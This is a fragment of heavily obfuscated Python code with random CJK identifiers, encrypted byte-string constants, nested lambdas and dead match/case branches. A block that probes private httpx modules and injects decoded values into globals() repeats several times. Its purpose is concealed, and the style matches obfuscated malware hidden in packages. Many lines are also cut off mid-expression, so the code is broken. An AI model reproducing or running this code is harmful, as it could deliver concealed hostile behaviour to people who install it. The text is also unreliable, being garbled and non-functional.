樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()

try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx')._client
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()

try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx')._config
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx')._content
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx')._decoders
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx')._exceptions
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 